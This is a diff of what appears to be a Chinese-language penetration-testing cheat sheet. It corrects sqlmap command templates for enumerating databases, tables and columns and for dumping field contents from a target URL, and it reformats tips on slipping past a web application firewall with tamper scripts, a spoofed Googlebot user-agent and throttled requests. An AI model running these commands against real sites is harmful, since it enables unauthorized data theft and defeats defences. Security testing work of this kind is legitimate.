@@ -155,12 +155,13 @@
 <h2 id="cewl-custom-word-list-generator">CeWL - Custom Word List generator</h2>
 <h1 id="sql">SQL</h1>
 <h2 id="sqlmap">sqlmap</h2>
-<p>sqlmap.py -u url --dbms                 爆数据库
-sqlmap.py -u url --dbms "数据库名" --table              爆数据库表
+<p>sqlmap.py -u url --dbms                 爆后端数据库
+sqlmap.py -u url --dbms "数据库名" --dbs 
+sqlmap.py -u url --dbms "数据库名" --tables              爆数据库表
 sqlmap.py -u url --dbms "数据库名" --current-db             显示当前连接数据库名
-sqlmap.py -u url --dbms "数据库名" --tables  -D "表名"                   列出数据库表中的表名
+sqlmap.py -u url --dbms "数据库名" --tables  -D "数据库名"                   列出数据库表中的表名
 sqlmap.py -u url --dbms "数据库名" --columns  -T "表名" -D "数据库名"         列出数据库名中的表名内容
-sqlmap.py -u url --dbms  "数据库名"  --dump  -C "字段,字段"  -T "表名" -D "数据库表"       获取字段里面的内容</p>
+sqlmap.py -u url --dbms "数据库名" --dump  -C "字段,字段"  -T "表名" -D "数据库名"       获取字段里面的内容</p>
 <ul>
 <li>option</li>
 </ul>
@@ -185,16 +186,16 @@ sqlmap.py -u url --dbms  "数据库名"  --dump  -C "字段,字段"  -T "表名"
 
 
 <ul>
-<li>大量出现 unable to connect ，表明流量被WAF拦截
-1 使用tamper 
-2
---user-agent "Googlebot (http://www.google.com/)
---user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0"
-3 设置延迟时间或线程数
---threads 线程数
---delay 延迟</li>
+<li>大量出现 unable to connect ，表明流量被WAF拦截</li>
 </ul>
-<h1 id="waf-tamper">绕过 waf 的tamper</h1>
+<p>1 使用tamper </p>
+<p>2
+--user-agent "Googlebot (http://www.google.com/)
+--user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0"</p>
+<p>3 设置延迟时间或线程数
+--threads 线程数
+--delay 延迟</p>
+<h3 id="waf-tamper">绕过 waf 的tamper</h3>
 <ol>
 <li>
 <p>apostrophemask.py        用UTF-8全角字符替换单引号字符</p>
